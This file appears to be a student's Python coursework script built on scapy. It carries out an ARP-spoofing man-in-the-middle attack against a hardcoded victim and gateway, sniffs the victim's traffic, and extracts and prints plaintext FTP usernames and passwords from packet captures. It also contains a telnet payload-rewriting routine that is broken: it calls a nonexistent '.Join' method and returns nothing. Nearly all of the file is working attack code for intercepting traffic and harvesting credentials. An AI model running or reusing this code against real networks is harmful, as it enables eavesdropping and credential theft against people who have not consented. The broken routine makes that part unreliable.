from multiprocessing import Process
import scapy.all as scapy
from scapy.layers.http import HTTPRequest, HTTPResponse, TCP
from scapy.utils import hexdump
import pyshark
import os
import sys
import time


def iteratePcap(pcap_path):
    yield from scapy.PcapReader(pcap_path)


def get_mac(ip):
    """
    this function gets and records the MAC address of the network
    :param ip:
    :return: mac address of device allocated ip
    """
    arp_pkt = scapy.ARP(pdst=ip)
    broadcast_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    responses = scapy.srp(broadcast_pkt / arp_pkt,
                          timeout=1,
                          verbose=False)[0]
    for rep in responses:
        return rep[1].hwsrc


class Arper:
    def __init__(self, victim, destination, interface="eth0"):
        self.victim_ip = victim
        self.gateway_ip = destination
        self.interface = interface

        self.victim_mac = get_mac(self.victim_ip)
        self.gateway_mac = get_mac(self.gateway_ip)

        self.poisoner = Process(target=self.poison)
        self.sniffer = Process(target=self.sniff, args=(100,))

    def run(self):
        """
        create concurrent processes to sniff and poison
        """
        # self.sniff()
        # self.poisoner.start()
        self.sniffer.start()

        # self.poisoner.join()
        # self.sniffer.join()

    def poison(self):
        victim_poison = scapy.ARP(op=2, psrc=self.gateway_ip, pdst=self.victim_ip, hwdst=self.victim_mac)
        gateway_poison = scapy.ARP(op=2, psrc=self.victim_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)

        run = True
        while run:
            try:
                scapy.send(victim_poison)
                scapy.send(gateway_poison)
            except:
                self.end()
                run = False

            time.sleep(10)

    def packet_sniff(self, filter):
        while True:
            packet = scapy.sniff(count=1, filter=filter)
            print(packet.summary())
            yield packet

    def sniff(self, count=100):
        # this function performs the sniffing attack
        victim_ip_filter = f"ip host {self.victim_ip}"
        packet_gen = self.packet_sniff(victim_ip_filter)

        caputure = []
        i = 0
        # for i in range(count):
        while True:
            caputure.append(next(packet_gen))
            print(f"captured {self.victim_ip} {i + 1}/{count}")
            i += 1

    def restore(self):
        victim_cure = scapy.ARP(op=2,
                                psrc=self.victim_ip,
                                pdst=self.gateway_ip,
                                hwsrc=self.victim_mac,
                                hwdst="ff:ff:ff:ff:ff:ff")
        gateway_cure = scapy.ARP(op=2,
                                 psrc=self.gateway_ip,
                                 pdst=self.victim_ip,
                                 hwsrc=self.gateway_mac,
                                 hwdst="ff:ff:ff:ff:ff:ff")

        scapy.send(victim_cure)
        scapy.send(gateway_cure)

    def end(self):
        self.restore()
        # sys.exit(1)


class filter:
    def __init__(self, capture_itr):
        self.capture_itr = capture_itr
        # self.packets = [pkt for pkt in capture_itr]

    def processPackets(self):
        first_100 = []
        plaintest_passwd_user = []
        img_responses = []

        telnet_pkts = []
        modified_telnet = []

        counter = 0
        for pkt in self.capture_itr:
            if counter < 100:
                first_100.append(pkt)
            if self.longinPkt(pkt):
                plaintest_passwd_user.append(pkt)
            if self.respImgPkt(pkt):
                img_responses.append(pkt)
            if self.telnetPkt(pkt):
                telnet_pkts.append(pkt)
                modified_telnet.append(self.modifyTCPDFData(pkt=pkt, repalceWith="R"))

            counter += 1

        # telnet replacement here
        return first_100, plaintest_passwd_user, img_responses, modified_telnet

    def inRawDataFilter(self, pkt, filter):
        if filter in pkt:
            return True
        return False

    def isFTP(self, pkt):
        if pkt.haslayer("TCP") and pkt.haslayer("Raw"):
            return True
        return False

    def isSuccessfulLogin(self, pkt_data):
        return self.inRawDataFilter(filter="230", pkt=pkt_data)

    def getLogins(self, extract=False):
        """
        gets the login details
        not part of CW but got board
        :param extract:
        :return:
        """
        username_search = ["USER"]
        # username_search.extend([w.upper() for w in username_search])
        password_search = ["PASS"]
        # password_search.extend([w.upper() for w in password_search])

        usernames = []
        passwords = []
        login_contr = 0
        for pkt in self.capture_itr:
            if self.isFTP(pkt):
                try:
                    raw_data = pkt["Raw"].load.decode("utf-8")
                except:
                    raw_data = pkt["Raw"].load.decode("latin-1")

                new_creds_found = False

                if any(ext in raw_data for ext in username_search):
                    for username_field in username_search:
                        if len(raw_data.split(username_field)) > 1:
                            usernames.append(raw_data.split(username_field)[1].strip())
                            new_creds_found = True

                if any(ext in raw_data for ext in password_search):
                    for password_field in password_search:
                        if len(raw_data.split(password_field)) > 1:
                            passwords.append(raw_data.split(password_field)[1].strip())
                            new_creds_found = True

                if not new_creds_found:
                    # check for a sucsessfull login response
                    if self.isSuccessfulLogin(raw_data):
                        login_contr += 1

        if extract:
            print("#####Successful logins#####")
            for i in range(min(len(usernames), login_contr)):
                print(f"USER:   {usernames[i]},    PASS:    {passwords[i]}")

            print("#####all attempted logins#####")
            for i in range(min(len(usernames), len(passwords))):
                print(f"USER:   {usernames[i]},    PASS:    {passwords[i]}")

    def longinPkt(self, pkt):
        """
        true if packet containing plain text password and/or username.
        :param pkt:
        :return:
        """
        username_search = ["USER"]
        # username_search.extend([w.upper() for w in username_search])
        password_search = ["PASS"]
        # password_search.extend([w.upper() for w in password_se

        if self.isFTP(pkt):
            try:
                raw_data = pkt["Raw"].load.decode("utf-8")
            except:
                raw_data = pkt["Raw"].load.decode("latin-1")

            new_creds_found = False

            if any(ext in raw_data for ext in username_search):
                for username_field in username_search:
                    if len(raw_data.split(username_field)) > 1:
                        return True

            if any(ext in raw_data for ext in password_search):
                for password_field in password_search:
                    if len(raw_data.split(password_field)) > 1:
                        return True

        return False

    def respImgPkt(self, pkt):
        """
        true if HTTP packet is respons & contains images.
        :return:
        """
        # test if HTTPResponse
        if pkt.haslayer("TCP"):
            if pkt.haslayer(HTTPResponse):
                header = pkt.payload.payload.payload.payload
                content_type = header.Content_Type
                try:
                    string_ctype = content_type.decode("utf-8")
                except:
                    string_ctype = content_type.decode("latin-1")

                if "image" in string_ctype:
                    return True
        return False

    def telnetPkt(self, pkt):
        """
        true if Telnet packets and replace each typed character in the communication to ‘R’.
        :return:
        """
        # test for telnet port
        # test for telnet protocol

        # maybe test if the payload contains the character R....
        if pkt.haslayer("TCP"):
            source_port = pkt[scapy.TCP].sport
            destiantion_port = pkt[scapy.TCP].dport
            if (source_port == 23 or destiantion_port == 23) or (source_port == 3005 or destiantion_port == 3005):
                return True

        return False

    def modifyTCPDFData(self, pkt, repalceWith="R"):
        payload = pkt[TCP].payload
        if payload.name == "NoPayload":
            return pkt
        else:
            try:
                data = payload.load.decode("utf-8")
                r_data = " ".Join(["R" for _ in range(len(data))])
                bytes_data = bytes(r_data, 'UTF-8')
            except:
                pass


def arpSpoof():
    # (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    (victim, destination, interface) = ("192.168.2.209", "192.168.2.1", "wlp59s0")
    myarp = Arper(victim, destination, interface)
    myarp.run()


def logins():
    pkt_iterator = iteratePcap("data/captures/example/wwb001-hackerwatch.pcapng")
    filterer = filter(capture_itr=pkt_iterator)
    filterer.getLogins()


def questions():
    # pkt_iterator = iteratePcap("data/captures/example/wwb001-hackerwatch.pcapng")
    # pkt_iterator = iteratePcap("data/captures/example/http_witp_jpegs.cap")
    pkt_iterator = iteratePcap("data/captures/example/telnet.cap")
    filterer = filter(capture_itr=pkt_iterator)
    filterer.processPackets()


if __name__ == '__main__':
    # arpSpoof()
    questions()
